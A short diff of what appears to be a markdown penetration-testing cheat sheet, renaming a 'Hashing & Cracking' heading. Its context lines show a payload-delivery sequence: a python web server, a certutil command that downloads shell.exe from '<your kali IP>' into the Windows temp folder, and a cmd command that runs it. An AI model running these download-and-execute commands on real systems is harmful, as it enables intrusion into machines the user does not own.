@@ -45,7 +45,7 @@ python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 cmd /c C:\\Windows\\temp\\shell.exe
 ````
-### Hashing & Cracking them
+### Hashing & Cracking
 #### Enumeration
 ````
 hashid <paste your hash here>
